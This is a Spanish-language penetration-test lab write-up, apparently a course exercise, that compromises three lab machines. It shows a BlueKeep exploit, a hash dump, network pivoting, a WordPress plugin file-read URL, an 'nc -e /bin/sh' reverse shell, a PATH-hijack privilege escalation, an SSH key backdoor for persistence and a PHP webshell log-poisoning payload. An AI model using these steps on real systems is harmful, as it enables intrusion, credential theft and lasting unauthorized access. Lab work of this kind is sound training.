# Write UP Proyecto 07

## PC01

Este PC es el inicial que podemos atacar y que nos servirá como enlace para el resto de la red corporativa. Por ello, empezaremos con un listado de todos los puertos abiertos para saber sus servicios, empleando el comando nmap para realizar la investigación:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled.png)

Al realizar una búsqueda simple, vemos el puerto 3389 abierto, por lo que afinaremos el nmap para tratar de descubrir más sobre este puerto en cuestión, sobre todo una búsqueda de información automática para descubrir información sobre el sistema:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%201.png)

Después de revisar la información correspondiente a los datos que nos ha otorgado nuestra búsqueda, se pudo descubrir que es vulnerable al bluekeep, un exploit que nos permitirá iniciar sesión dentro del sistema:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%202.png)

Una vez dentro del sistema, empleando el meterpreter dentro de la sesión, y los comandos getuid y sysinfo, podemos obtener la información sobre el propio sistema y el nombre de usuario del servidor:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%203.png)

Además, al usar el comando run post/windows/gather/hashdump, podemos obtener tanto los usuarios en texto plano, como sus contraseñas en hashes:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%204.png)

## PC02

Una vez obtenido toda la información que deseamos a través del meterpreter, lo que debemos realizar es la preparación para poder acceder al siguiente sistema, en este caso PC02. Para ello, usaremos socks_proxy para poder realizar esta labor, dejando en el background el meterpreter funcionando:

![Opciones socks proxy](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%205.png)

Opciones socks proxy

Una vez revisado que las opciones están puestas a nuestro gusto, se ejecutará en segundo plano, dado que no requiere nuestra monitorización continuada:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%206.png)

Una vez tengamos el socks corriendo en background, se tendrá que realizar un autorouting  partiendo del PC01 para poder asegurar nuestras conexiones al resto de sistemas de la red, marcando la sesión en la que está el meterpreter funcionando en segundo plano para que se enlace con el PC01:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%207.png)

Una vez esten configuradas las opciones del modulo, solo tendremos que ejecutarlo:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%208.png)

Una vez realizado el autorouting, procederemos a realizar un escaneo de la red 10.10.10.0/24 para comprobar que tenemos conexión con el resto de la red corporativa:

![Opciones modulo portscan/tcp](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%209.png)

Opciones modulo portscan/tcp

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2010.png)

Como podemos ver podemos realizar el escaneo sin problemas en la red interna 10.10.10.0/24, pudiendo empezar a escanear el PC2.

Empezamos con una revisión de los puertos IP abiertos del PC2 con su servicio:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2011.png)

Luego, proseguimos con la revisión de la versión del Samba para ver sus características:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2012.png)

Comprobamos también la enumeración de los directorios compartidos 

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2013.png)

En este último caso, descubrimos que podemos conectarnos al smb como usuario anonymous, pasando a realizar la comprobación:

SMB Anonymous

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2014.png)

Al abrir el archivo attention.txt encontramos el siguiente texto:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2015.png)

Dado que parece que están usando esas posibles contraseñas, pasamos a intentar enumerar los usuarios para hacer pruebas de acceso:

Usuarios en Samba

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2016.png)

Hemos encontrado un usuario, helios, que al loggearnos al smb utilizando las contraseñas logramos entrar:

SMB Helios

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2017.png)

Dentro del smb, descargamos los dos archivos txt que tiene el usuario, y los revisamos para ver su contenido:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2018.png)

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2019.png)

Encontramos una dirección en todo.txt, /h3l105, que si entramos podemos comprobar que esta siendo alojada en un WordPress:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2020.png)

Ahora tendremos que realizar un port forwarding en el meterpreter:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2021.png)

Con esto, podemos realizar un wpscan utilizando proxychain4:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2022.png)

Encontramos que tiene el directorio /wp-content/uploads/:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2023.png)

Vemos que contiene un plugin, Site Editors:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2024.png)

Que buscaremos en [exploit-db.com](http://exploit-db.com) para ver si encontramos alguna vulnerabilidad que pueda ser explotada:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2025.png)

Que nos dice en su prueba de concepto que visitando la siguiente dirección:

http://10.10.10.4/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

Accedemos al archivo /etc/passwd del equipo PC02:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2026.png)

Ahora necesitamos realizar una ejecución remota de código, para ello usaremos el telnet alojado en el puerto 25:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2027.png)

Ahora podremos visualizar en la siguiente dirección que se ejecuto correctamente:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2028.png)

Vemos que estamos ejecutando el comando whoami, y su respuesta que es helios.

Podremos crear una shell inversa cambiando el comando por ***nc -e /bin/sh <IP-Maquina-PC1> 4466*** y con ello, creamos una redirección con netsh en la máquina PC1, la cual reenviara el puerto 4466 a nuestro equipo atacante para obtener la shell:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2029.png)

Agregamos una regla al firewall para permitir la salida del puerto de la revshell.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2030.png)

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2031.png)

Podemos comprobar que hemos recibido la shell correctamente y estamos dentro de la máquina PC2.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2032.png)

Ahora procederemos a la escalada de privilegios, por lo que vamos a buscar que binarios pueden ser ejecutados como root por el usuario helios

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2033.png)

Tras analizar el programa objetivo para la escalada, vemos que puede ejecutar el comando “curl” con este servicio.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2034.png)

Si creamos un archivo en la carpeta /tpm llamado curl, hacemos que ejecute el siguiente comando para darle privilegios **SUID** a /bin/bash, luego Añadimos /tmp dentro de la variable $PATH asignándole prioridad y llamamos a /opt/statuscheck podemos realizar la escalada de privilegios:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2035.png)

Ahora vamos a realizar la persistencia en el PC02 mediante clave pública.

Como mediante el escáner de puertos hemos comprobado que tiene el puerto de SSH abierto en el equipo, se ha creado un backdoor en el mismo, para ello vamos a crear un par de claves públicas en nuestro equipo atacante:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2036.png)

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2037.png)

Esta misma clave vamos a copiarla en la máquina objetivo, en la ruta “/root/.shh/authorized_keys”. Así, siempre tendremos acceso por SSH a la máquina como el usuario root, ya que no disponemos de nano vamos a añadirlo al fichero mediante “echo”:

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2038.png)

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2039.png)

Simplemente deberemos reiniciar el servicio con “service ssh restart” y si queremos comprobar que se ha reiniciado correctamente, podemos hacer un “status” del mismo servicio, podemos redirigirlo a un fichero .txt para mostrarlo.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2040.png)

Ahora tenemos conexión con la máquina victima simplemente redireccionando el puerto 22 a nuestra máquina atacante.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2041.png)

## PC04

Después de enlazar el PC 1 con el PC04 a través de socks_proxy siguiendo la misma preparación que en el PC02, procedemos a escanear los puertos del PC04 para comprobar que servicios están abiertos. 

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2042.png)

Podemos comprobar que los servicios de los puertos http (80, 8593 y 54787) están abiertos, además de que el puerto 8593 tiene enlazado dos enlaces diferentes. Al revisar dichos enlaces, podemos verificar que cambia el enlace, por lo que se puede proceder a un Local File Inclusion.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2043.png)

Decidimos probar a añadir a dicho enlace ../../../../../../etc/passwd, para ver si tenemos acceso al archivo /etc/passwd; y al realizarlo podemos verificar que accedemos completamente a su contenido sin ningún tipo de problema.

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2044.png)

Al verificar la vulnerabilidad a los ataques de Local File Inclusion, vamos a realizar una explotación de dicha vulnerabilidad. La manera en la que la realizaremos será la siguiente:

Empleamos el comando **proxychains nc 10.10.10.130 80**, indicando que estamos atacando el puerto 80, y tras ejecutarlo ponemos el siguiente código, pulsando la tecla ENTER al final: **GET <?php system($_GET[‘cmd’]);?> HTTP/1.1**

![Untitled](Write%20UP%20Proyecto%2007%2058d947eecd1f45caaeedd4a6b887a6e7/Untitled%2045.png)